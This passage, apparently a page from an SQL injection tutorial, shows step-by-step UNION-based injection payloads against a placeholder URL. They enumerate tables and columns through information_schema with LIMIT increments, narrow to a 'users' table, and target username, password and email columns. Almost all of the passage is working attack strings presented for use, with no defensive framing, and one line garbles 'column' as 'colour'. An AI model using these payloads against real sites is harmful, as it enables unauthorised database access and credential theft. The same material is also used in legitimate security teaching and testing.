- pgno: 32
  md: 'The second table will be displayed. Now for the third table we should put the
    limit as 2, 1.


    ```

    http://www.site.com/news.php?id=5 union all select 1, table_name,3 from information_schema.tables
    limit 2,1/*

    ```


    Until you get anything useful we should keep incrementing. You can use the same
    method to get the names of the columns.


    For getting the names of the columns we use the column_name and the information_schema.columns


    For example:


    ```

    http://www.site.com/news.php?id=5 union all select 1,column_name,3 from information_schema.columns
    limit 0,1/*

    ```


    For the 2nd column you should change the limit to 1,1.


    ```

    http://www.site.com/news.php?id=5 union all select 1,column_name,3 from information_schema.columns
    limit 1,1/*

    ```


    Till you find some important columns, you should keep incrementing.


    The 2nd column is exhibited, so continue incrementing till you get something like


    Username, user, password, login, pass, password etc...


    Use this query if you wish to display the colour names from a specific table (where
    clause)


    Let''s assume we found table ''users''.


    ```

    http://www.site.com/news.php?id=5 union all select 1,column_name,3 from information_schema.columns
    where table_name=''users''/*

    ```


    This will display the column names from the table ''users''. And by using LIMIT,
    all the columns can be listed.


    Note: If the magic quotes are on, this won''t work.


    Let''s say that we found columns user, pass or password and email.'
